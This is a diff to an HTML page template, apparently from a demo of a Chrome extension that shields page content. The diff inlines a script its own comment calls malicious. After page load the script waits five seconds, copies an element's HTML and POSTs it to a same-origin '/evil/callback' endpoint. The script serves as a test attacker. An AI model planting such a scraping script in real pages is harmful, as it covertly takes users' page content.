@@ -38,7 +38,30 @@
       </div>
     </div>
 
-    <script type="text/javascript" src="{% static 'evil.js' %}"></script>
+    <script type="text/javascript">
+      /**
+       * This is a malicious piece of JavaScript that is served on the same origin as the server.
+       * This might arise from a compromised web server, malicious developers, or through XSS
+       * vulnerabilities on the web application.
+       */
+
+      document.addEventListener('DOMContentLoaded', function() {
+        // Wait for 5 seconds for the Chrome extension to finish replacement
+        setTimeout(function() {
+          // Get HTML content from the page
+          var data = new FormData();
+          data.append('html', document.getElementById('evilcontainer').outerHTML);
+
+          // Send XMLHttpRequest
+          const XHR = new XMLHttpRequest();
+          XHR.open('POST', '/evil/callback');
+          XHR.send(data);
+
+          console.info('Evil deed complete, hehehe...');
+        }, 5000);
+      });
+    </script>
+
     <script
       src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
       integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"
